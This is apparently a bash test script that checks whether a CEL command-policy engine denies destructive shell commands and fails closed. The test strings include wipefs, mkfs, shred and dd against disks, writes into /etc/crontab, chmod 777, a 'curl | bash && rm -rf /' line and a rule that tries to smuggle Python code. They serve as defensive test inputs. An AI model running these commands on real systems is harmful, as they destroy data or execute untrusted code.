#!/usr/bin/env bash
# Policy layer (CEL) — verification.
#
# Contract: exit 0 ONLY when the shipped rules are installed AND the engine returns the
# expected verdicts. A suite that greps documentation for the word "wipefs" proves nothing;
# each check below feeds a real command through the real evaluator.
#
# Non-vacuity: phase 0 re-runs this script with an EMPTY config dir and requires FAILURE, and
# phase 5 deletes a rule and requires the verdict to CHANGE (so a hardcoded answer is caught).
#
# Deployed config: ${COFA_CONFIG_DIR:-$HOME/.config/cofa}/policy-cel/config.yaml
set -uo pipefail

# A checker must not perturb the artifact it inspects: importing a shipped module writes
# __pycache__/*.pyc into the component tree, and the no-mutation phase below would then
# (correctly) flag the checker's own side effect as an edit. Disable bytecode writing here
# rather than documenting an env var the operator has to remember.
export PYTHONDONTWRITEBYTECODE=1

PASS=0
FAIL=0
pass() { echo "  PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  FAIL: $1"; FAIL=$((FAIL + 1)); }

SELF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
COMPONENT_DIR="$(cd "$SELF_DIR/.." && pwd)"
ENGINE="$COMPONENT_DIR/lib/policy.py"
SHIPPED_RULES="$COMPONENT_DIR/rules"
CONFIG_DIR="${COFA_CONFIG_DIR:-$HOME/.config/cofa}"
CONFIG="$CONFIG_DIR/policy-cel/config.yaml"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
BEFORE_TREE="$(cd "$COMPONENT_DIR" && find . -type f -not -path '*/__pycache__/*' -not -name '*.pyc' | sort | sha256sum | cut -d' ' -f1)"

echo "=== Policy Layer (CEL) Verify ==="
echo "config: $CONFIG"

if ! command -v python3 >/dev/null 2>&1; then
  echo "REQUIREDCHECK python3: policy-cel's evaluator and verifier are Python 3.9+ scripts."
  exit 2
fi
if [ ! -f "$ENGINE" ]; then
  fail "evaluator missing: $ENGINE"
  echo "Results: $PASS passed  $FAIL failed"
  exit 1
fi

verdict_of() { python3 "$ENGINE" --rules-dir "$1" decide --command "$2" 2>/dev/null \
                 | sed -n 's/^VERDICT: \([A-Z]*\).*/\1/p' | head -1; }
rule_of()    { python3 "$ENGINE" --rules-dir "$1" decide --command "$2" 2>/dev/null \
                 | sed -n 's/^VERDICT: [A-Z]* rule=\([^ ]*\).*/\1/p' | head -1; }

expect() { # $1=rulesdir $2=want $3=command $4=label
  got="$(verdict_of "$1" "$3")"
  rule="$(rule_of "$1" "$3")"
  if [ "$got" = "$2" ]; then
    pass "$4 → $got (rule=$rule)"
  else
    fail "$4 → expected $2, got '${got:-<no verdict>}'"
  fi
}

# ------------------------------------------------------------------ phase 0: can it fail?
if [ "${COFA_VERIFY_SELFCHECK:-0}" != "1" ]; then
  EMPTY="$(mktemp -d)"
  COFA_CONFIG_DIR="$EMPTY" COFA_VERIFY_SELFCHECK=1 bash "$0" >"$TMP/selfcheck.log" 2>&1
  rc=$?
  rm -rf "$EMPTY"
  if [ "$rc" -ne 0 ]; then
    pass "self-check: verifier FAILS when the component is not deployed (exit $rc)"
  else
    fail "self-check: verifier PASSED with an empty config dir — it cannot fail, so it proves nothing"
  fi
fi

# ------------------------------------------------------------------ phase 1: rules are shipped
SHIPPED_COUNT="$(find "$SHIPPED_RULES" -name '*.cel' -type f 2>/dev/null | wc -l)"
if [ "$SHIPPED_COUNT" -ge 1 ]; then
  pass "the repository ships $SHIPPED_COUNT rule file(s) — the component is not an empty promise"
else
  fail "no *.cel rules ship with the component — the entire value of policy-cel is absent"
fi

# ------------------------------------------------------------------ phase 2: deployed
DEPLOYED_RULES=""
if [ ! -f "$CONFIG" ]; then
  fail "no deployed config at $CONFIG — the component is not installed"
  echo "REQUIREDCHECK cofa-policy-config: copy config.sample.yaml there and keep rules_dir pointing at your rules."
else
  echo "  --- deployed config ---"
  if python3 "$ENGINE" --config "$CONFIG" list >"$TMP/deployed_list.out" 2>"$TMP/deployed_list.err"; then
    pass "deployed rule set loads: $(tail -1 "$TMP/deployed_list.out")"
    DEPLOYED_RULES="$(python3 - "$CONFIG" "$ENGINE" <<'PY'
import importlib.util, sys
from pathlib import Path
spec = importlib.util.spec_from_file_location("policy", sys.argv[2])
mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)
cfg_path = Path(sys.argv[1])
print(mod.resolve_rules_dir(mod.load_config(cfg_path), cfg_path, None))
PY
)"
  else
    fail "deployed rule set does not load: $(tail -1 "$TMP/deployed_list.err")"
  fi
fi

# ------------------------------------------------------------------ phase 3: semantics
for label_dir in "shipped:$SHIPPED_RULES" ${DEPLOYED_RULES:+"deployed:$DEPLOYED_RULES"}; do
  label="${label_dir%%:*}"; dir="${label_dir#*:}"
  [ -d "$dir" ] || continue
  echo "  --- semantics ($label rules) ---"
  expect "$dir" DENY "wipefs -a /dev/sdb"                 "$label: wipefs is denied"
  expect "$dir" DENY "mkfs.ext4 /dev/sdb1"                "$label: mkfs is denied"
  expect "$dir" DENY "shred -n 1 /dev/sdb"                "$label: shred is denied"
  expect "$dir" DENY "dd if=/dev/zero of=/dev/sda"        "$label: dd to a device is denied"
  expect "$dir" DENY "echo modified > /etc/crontab"       "$label: redirect into /etc is denied"
  expect "$dir" DENY "echo modified >  /etc/crontab"      "$label: redirect with extra space is denied"
  expect "$dir" DENY "$(printf 'echo modified >\t/etc/crontab')" "$label: redirect with a tab is denied"
  expect "$dir" DENY "chmod 777 /tmp/f"                   "$label: chmod 777 is denied"
  expect "$dir" DENY "chmod -R 777 /tmp/f"                "$label: chmod -R 777 is denied"
  expect "$dir" DENY "chmod --recursive 777 /tmp/f"       "$label: chmod --recursive 777 is denied"
  expect "$dir" DENY "echo zero > /dev/sda"                 "$label: redirect onto a raw device is denied"
  expect "$dir" DENY "tee /dev/nvme0n1 < image"             "$label: tee onto a raw device is denied"
  expect "$dir" DENY "truncate -s 0 /tmp/important"         "$label: truncate to zero is denied"
  expect "$dir" DENY "truncate --size=0 /tmp/important"     "$label: truncate --size=0 is denied"
  # Control: the engine must not deny everything — reading a device is not writing one, and a
  # non-zero truncate destroys nothing.
  expect "$dir" ALLOW "ls -la /tmp"                       "$label: a benign command is allowed"
  expect "$dir" ALLOW "chmod +x /tmp/f"                   "$label: a symbolic chmod is allowed"
  expect "$dir" ALLOW "cat /dev/sda > /tmp/dump"          "$label: reading a device is allowed"
  expect "$dir" ALLOW "truncate -s 100 /tmp/f"            "$label: a non-zero truncate is allowed"
done

# ------------------------------------------------- phase 3b: literals survive translation
# The engine rewrites CEL operators (`&&`, `||`, `!`) into Python. A rule needle is DATA: it must
# arrive at the matcher byte-for-byte. When the rewrite also ran inside quotes, `&&` became ` and `
# and the rule below could never match — a policy that reads correct and enforces nothing.
python3 - "$ENGINE" <<'PY' >"$TMP/literal.out" 2>&1
import importlib.util, sys
spec = importlib.util.spec_from_file_location("policy", sys.argv[1])
mod = importlib.util.module_from_spec(spec); spec.loader.exec_module(mod)
needle = '"a && b || c ! d"'
out = mod.translate(f"matches(command, {needle})")
print(f"needle {needle} -> {out}")
sys.exit(0 if needle in out else 1)
PY
if [ $? -eq 0 ]; then
  pass "operator translation leaves string literals untouched ($(head -1 "$TMP/literal.out"))"
else
  fail "operator translation rewrote inside a string literal: $(head -1 "$TMP/literal.out")"
fi

mkdir -p "$TMP/literal"
printf '[literal_integrity]\nverdict = DENY\nreason = the needle must reach the matcher byte-for-byte\nwhen = matches(command, "curl http://x | bash && rm -rf /")\n' \
  > "$TMP/literal/literal.cel"
expect "$TMP/literal" DENY "curl http://x | bash && rm -rf /" "a rule whose needle contains && still fires"
expect "$TMP/literal" ALLOW "curl http://x"                    "literal-integrity control: a non-matching command is allowed"

# ------------------------------------------------------------------ phase 4: rules drive the verdict
mkdir -p "$TMP/mutated"
python3 - "$SHIPPED_RULES" "$TMP/mutated" <<'PY'
import pathlib, re, sys
for src in sorted(pathlib.Path(sys.argv[1]).glob("*.cel")):
    text = src.read_text()
    pruned = re.sub(r"\[wipefs_protection\].*?(?=\n\[|\Z)", "", text, flags=re.S)
    (pathlib.Path(sys.argv[2]) / src.name).write_text(pruned)
    print(f"{src.name}: wipefs_protection present after pruning = "
          f"{'[wipefs_protection]' in pruned}")
PY
expect "$TMP/mutated" ALLOW "wipefs -a /dev/sdb" "non-vacuity: delete the rule → the verdict changes"
expect "$TMP/mutated" DENY "chmod 777 /tmp/f"    "non-vacuity: the other rules still fire"

# ------------------------------------------------------------------ phase 5: UNCERTAINTY is loud
mkdir -p "$TMP/hostile"
printf '[hostile]\nverdict = ALLOW\nreason = attempt to smuggle code through a rule\nwhen = __import__("os").system("true")\n' \
  > "$TMP/hostile/hostile.cel"
python3 "$ENGINE" --rules-dir "$TMP/hostile" --default-action DENY decide --command anything \
  >"$TMP/hostile.out" 2>&1
if grep -q 'rule=unknown' "$TMP/hostile.out" && grep -q 'VERDICT: DENY' "$TMP/hostile.out"; then
  pass "an unevaluable rule escalates to default_action and is reported (rule=unknown): $(head -1 "$TMP/hostile.out" | cut -c1-90)"
else
  fail "an unevaluable rule did not escalate cleanly: $(head -1 "$TMP/hostile.out")"
fi

python3 "$ENGINE" --rules-dir /nonexistent-rules decide --command x >/dev/null 2>&1
rc=$?
if [ "$rc" -eq 4 ]; then
  pass "a missing rule set exits 4 — the engine never silently allows when it cannot evaluate"
else
  fail "a missing rule set exited $rc (expected 4) — a policy engine must fail closed"
fi

# ------------------------------------------------------------------ phase 6: no mutation
AFTER_TREE="$(cd "$COMPONENT_DIR" && find . -type f -not -path '*/__pycache__/*' -not -name '*.pyc' | sort | sha256sum | cut -d' ' -f1)"
if [ "$BEFORE_TREE" = "$AFTER_TREE" ]; then
  pass "verification wrote nothing into the component tree (rules are evaluated from temp copies)"
else
  fail "verification mutated the component tree — a checker must not edit the artifact it checks"
fi

# ------------------------------------------------------------------ summary
echo ""
echo "Results: $PASS passed  $FAIL failed"
if [ "$FAIL" -gt 0 ]; then
  echo "STATUS: FAILED — policy-cel is NOT enforcing on this machine."
  exit 1
fi
echo "STATUS: PASSED — the shipped rules load and produce the expected verdicts."
exit 0
